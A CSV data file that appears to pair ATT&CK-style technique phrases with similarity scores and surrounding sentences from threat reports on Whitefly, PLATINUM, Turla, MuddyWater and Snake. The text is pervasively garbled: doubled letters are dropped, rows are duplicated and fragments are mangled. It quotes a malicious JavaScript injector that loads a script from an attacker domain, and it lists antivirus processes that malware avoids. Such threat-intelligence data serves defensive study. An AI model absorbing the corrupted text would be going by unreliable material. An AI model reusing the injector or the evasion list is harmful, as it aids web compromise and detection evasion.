hash,phrase,similarity,adjacent_sentences
18c26951bd00fb6e41199b99210fa0f8,"Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.",0.8358601612335047,"['If the browser version contains a vulnerability, coresponding exploitation code gets run on the target system, potentialy giving the atacker a remote code execution ability.', 'For these types of atacks, adversaries often leverage JavaScript.', 'For instance, acording to a malware analysis report performed by Palo Alto, analyzing threat samples from April 202 to June 202, among al of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 30 diferent domains [31].', 'Analysis shows that atackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.apendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'htps:/train.developfirstline.com/delivery.js?s=3\' elem.apendAfter(document.getElementsByTagName(\'script\')(0]) elem.apendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.apendChild(elem) .', '.', '.', '37 #1.8.']"
ebecdc07f2807b35090bbf533a818117,Whitefly has used search order hijacking to run the loader Vcrodat.,0.8281677937371719,"['To date, Whitefly has atacked organizations in the healthcare, media, telecomunications, and enginering sectors.', 'How Whitefly compromises its victims htps:/w.symantec.com/blogs/threat-inteligence/whitefly-espionage-singapore 1/4 3/7/2019 Whitefly: Espionage Group has Singapore in Its Sights | Symantec Blogs Whitefly first infects its victims using a droper in the form of a malicious .exe or .dl file that is disguised as a document or image.', 'These files frequently purport to ofer information on job openings or apear to be documents sent from another organization operating in the same industry as the victim.', 'Given the nature of disguise, its highly likely that they are sent to the victim using spear-phishing emails.', 'If opened, the droper runs a loader known as Trojan.Vcrodat on the computer.', 'Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.', 'This technique takes advantage of the fact that Windows does not require an aplication to provide a specific path for a DL that it wishes to load.', 'If no path is provided, Windows searches for the DL in specific locations on the computer in a pre-defined order.', 'Atackers can therefore give a malicious DL the same name as a legitimate DL but place it ahead of the legitimate version in the search order so that it wil be loaded when Windows searches for it.', 'Whitefly frequently delivers Vcrodat as a malicious DL that has the same name as DLs belonging to legitimate software from various security vendors.', 'The group leverages search order hijacking to asure that its malicious DLs wil be executed.']"
ebecdc07f2807b35090bbf533a818117,Whitefly has used search order hijacking to run the loader Vcrodat.,0.8281677937371719,"['To date, Whitefly has atacked organizations in the healthcare, media, telecomunications, and enginering sectors.', 'How Whitefly compromises its victims htps:/w.symantec.com/blogs/threat-inteligence/whitefly-espionage-singapore 1/4 3/7/2019 Whitefly: Espionage Group has Singapore in Its Sights | Symantec Blogs Whitefly first infects its victims using a droper in the form of a malicious .exe or .dl file that is disguised as a document or image.', 'These files frequently purport to ofer information on job openings or apear to be documents sent from another organization operating in the same industry as the victim.', 'Given the nature of disguise, its highly likely that they are sent to the victim using spear-phishing emails.', 'If opened, the droper runs a loader known as Trojan.Vcrodat on the computer.', 'Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.', 'This technique takes advantage of the fact that Windows does not require an aplication to provide a specific path for a DL that it wishes to load.', 'If no path is provided, Windows searches for the DL in specific locations on the computer in a pre-defined order.', 'Atackers can therefore give a malicious DL the same name as a legitimate DL but place it ahead of the legitimate version in the search order so that it wil be loaded when Windows searches for it.', 'Whitefly frequently delivers Vcrodat as a malicious DL that has the same name as DLs belonging to legitimate software from various security vendors.', 'The group leverages search order hijacking to asure that its malicious DLs wil be executed.']"
cae33c8970a53857dff6608fe8894b8a,"Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",0.8565410470624034,"['T1094 Custom Adversaries may comunicate using a custom comand and Comand and control protocol instead of encapsulating comands/data in an Control Protocol existing Standard Aplication Layer Protocol.', 'Implementations include mimicking wel-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.', 'T1024 Custom Adversaries may use a custom cryptographic protocol or algorithm Cryptographic to hide comand and control trafic.', 'A simple scheme, such as Protocol XOR-ing the plaintext with a fixed key, wil produce a very weak ciphertext.', 'Copyright Leonardo S.p.a. Al rights reserved 23 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 T1032 Standard Adversaries may explicitly employ a known encryption algorithm to Cryptographic conceal comand and control trafic rather than relying on any Protocol inherent protections provided by a comunication protocol.', 'Despite the use of a secure algorithm, these implementations may be vulnerable to reverse enginering if necesary secret keys are encoded and/or generated within malware samples/configuration files.', 'T158 Hiden Files To prevent normal users from acidentaly changing special files on and Directories a system, most operating systems have the concept of a hiden file.', 'These files dont show up when a user browses the file system with a GUI or when using normal comands on the comand line.', 'Users must explicitly ask to show the hiden files either via a series of Graphical User Interface (GUI) prompts or with comand line switches (dir /a for Windows and ls a for Linux and macOS).', 'T12 File and File and directory permisions are comonly managed by Directory discretionary aces control lists (DACLs) specified by the file or Permisions directory owner.', 'File and directory DACL implementations may vary Modification by platform, but generaly explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).']"
da720a0b860cc8b213511d0e3c6beb1b,They have also used zero-day exploits.,0.7883517276953522,"['By caling the bytesavailable method within the PostScript code, arbitrary code execution is achieved.', 'Identity Although the exact identity of PLATINUM remains unknown, the technical indicators observed so far can help create a profile of the atacker.', 'Usage of multiple backdors.', 'The diferent backdors writen by or for the group indicate a considerable investment over time.', 'Research indicates that PLATINUM has used multiple backdors concurently at times, which could represent either multiple teams within the activity group performing diferent campaigns, or diferent versions of the tols being used against varying victim networks.', 'Zero day exploits.', 'PLATINUM has used several zero-day exploits against their victims.', 'Regardles of whether they researched the exploits themselves or purchased them from independent researchers, the monetary investment required to colect and deploy zero-day exploits at this level is considerable.', 'Victim geography.', 'More often than not, research into targeted atacks shows The monetary in- activity groups becoming oportunistic and atacking topical targets; that is, targets considered valuable based on the geopolitical events of the year.', 'vestment required PLATINUM has consistently targeted victims within a smal set of countries in to colect and South and Southeast Asia.']"
da720a0b860cc8b213511d0e3c6beb1b,They have also used zero-day exploits.,0.7883517276953522,"['By caling the bytesavailable method within the PostScript code, arbitrary code execution is achieved.', 'Identity Although the exact identity of PLATINUM remains unknown, the technical indicators observed so far can help create a profile of the atacker.', 'Usage of multiple backdors.', 'The diferent backdors writen by or for the group indicate a considerable investment over time.', 'Research indicates that PLATINUM has used multiple backdors concurently at times, which could represent either multiple teams within the activity group performing diferent campaigns, or diferent versions of the tols being used against varying victim networks.', 'Zero day exploits.', 'PLATINUM has used several zero-day exploits against their victims.', 'Regardles of whether they researched the exploits themselves or purchased them from independent researchers, the monetary investment required to colect and deploy zero-day exploits at this level is considerable.', 'Victim geography.', 'More often than not, research into targeted atacks shows The monetary in- activity groups becoming oportunistic and atacking topical targets; that is, targets considered valuable based on the geopolitical events of the year.', 'vestment required PLATINUM has consistently targeted victims within a smal set of countries in to colect and South and Southeast Asia.']"
acd03c02cf6ad2828aa2ea83deeab0e9,Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.,0.8961383053234423,"['Information is subject to standard copyright rules.', 'For more information on the Trafic Light Protocol, se cisa.gov/tlp/.', 'TLP:CLEAR TLP:CLEAR International Partnership TABLE OF CONTENTS Sumary .', '1 Introduction .', '4 What is Snake?', '.', '4 Background .', '4 Atribution .', '5 Victimization .', '5 Other Tols and TPs Employed with Snake .', '6 Snake Architecture .']"
da720a0b860cc8b213511d0e3c6beb1b,JPIN can enumerate drives and their types.,0.7544668598318741,"['Security-related proceses avoided by the JPIN instaler Proces Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Proces Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmcore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After instaling the backdor, the instaler deletes itself from the compromised computer.', 'PLATINUM uses at least thre distinct JPIN variants.', 'One variant typicaly runs with a mutex named hMSVm and instals itself in the folders %apdata%\\Com\\Jpin and %userprofile%\\ApData\\Resource\\Jpin.', 'After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.']"
da720a0b860cc8b213511d0e3c6beb1b,JPIN can enumerate drives and their types.,0.7544668598318741,"['Security-related proceses avoided by the JPIN instaler Proces Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Proces Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmcore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After instaling the backdor, the instaler deletes itself from the compromised computer.', 'PLATINUM uses at least thre distinct JPIN variants.', 'One variant typicaly runs with a mutex named hMSVm and instals itself in the folders %apdata%\\Com\\Jpin and %userprofile%\\ApData\\Resource\\Jpin.', 'After it is instaled and started, the JPIN service can perform the folowing tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List runing services, proceses, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keyloger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.']"
6c2f6fc6cfe028db449b97edd9d9d029,"MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET.""",0.7623337080647709,"['The upload comand downloads files from the CnC and saves them localy in C:\\ProgramData.', '6.', 'The clean comand destroys the victims disk drives C, D, E, F and then rebots.', '7.', 'The rebot and shutdown comands imediately rebot and shut down the victims machine.', 'In one version of the malware, the code checks if the ProgramData folder has folders or files with the keywords Kasper, Panda, or ESET.', '7/12 Victimology 8/12 Most victims of MudyWater were found in Jordan, Turkey, Iraq, Pakistan, Saudi Arabia, Afghanistan and Azerbaijan.', 'Other victims were also recorded in Rusia, Iran, Bahrain, Austria and Mali.', 'The malicious decoy documents used in the atacks sugest they are geopoliticaly motivated, targeting sensitive personel and organizations.', 'Atacker deception and atribution The deobfuscated PowerShel code used by the MudyWater group resembles previously sen PowerShel scripts that most likely served as prototypes.', 'Multiple documents used in the atacks also contain embeded paths from their authors machines.']"
